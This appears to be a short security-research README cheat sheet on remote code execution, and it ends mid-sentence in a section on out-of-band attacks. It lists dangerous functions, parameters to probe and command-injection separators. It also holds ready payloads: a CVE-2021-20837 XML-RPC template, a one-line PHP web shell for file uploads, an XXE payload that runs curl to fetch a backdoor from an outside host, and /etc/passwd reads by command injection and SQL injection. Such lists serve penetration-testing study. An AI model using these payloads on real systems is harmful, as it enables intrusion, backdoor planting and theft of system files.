# RCE-reserch
Article about RCE vulnerability
RCE (Remote Code Execution) vulnerability is the possibility of executing malicious code or controlling and executing code remotely. This vulnerability is related to a security failure in a software or system. By using RCE, an attacker can gain complete control over the victim's system and perform various operations, obtain all kinds of sensitive information, and in some cases, target other attacks on other components and related networks.
System functions can be the main cause of RCE vulnerability. System functions are functions that run at the operating system level and allow a software program to communicate with system-dependent kernel parts.

If these functions are used unprotected and improperly, they allow attackers to execute their malicious code at the system level and obtain the execution of command line commands or perform other malicious activities. In other words, these are entry points for RCE attacks.

Some well-known functions that can create RCE risk potential include:

    system()
    execute()
    evaluate()
    passthru()
    shell_exec()
    open()

Parameters that may have an rce vulnerability

    ?cmd=
    ?exec=
    ?command=
    ?execute=
    ?ping=
    ?query=
    ?jump=
    ?code=
    ?reg=
    ?do=
    ?func=
    ?arg=
    ?option=
    ?load=
    ?process=
    ?step=
    ?read=
    ?function=
    ?req=
    ?feature=
    ?exe=
    ?module=
    ?payload=
    ?run=
    ?print=

vulnrability 


characters to find rce

    $()
    ; or ;;
    & or &&
    | or ||
    $ or $$
    `payload` -> `cat /etc/passwd`

xml-rpc to rce

CVE-2021-20837 

    <?xml version="1.0" encoding="UTF-8"?>
    <methodCall> <methodName>mt.handler_to_coderef</methodName>
      <params>
        <param>
          <value>
            <base64>
            #{base64_cmd}
            </base64>
          </value>
        </param>
      </params>
    </methodCall>


File upload to RCE

    <?php echo shell_exec($_GET['e'].' 2>&1'); ?>

XXE to RCE 

    <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE root [
     <!ENTITY file SYSTEM "expect://curl$IFS-O$IFS'1.3.3.7:8000/backdoor.php'">
     ]>
     <root>
    <name>Joe</name>
    <tel>ufgh</tel>
    <email>START_&file;_END</email>
    <password>kjh</password>
    </root>

SQLI to RCE

    UNION SELECT load_file(' /etc/passwd ')    

OOB(out of band)

    Unlike in-band attacks that take place in the same main channel between the service and the user, OOB attacks take place separately and outside the main channel. More precisely, in OOB attacks, the attacker communicates with the server through a separate channel (e.g. DNS) and transmits his commands
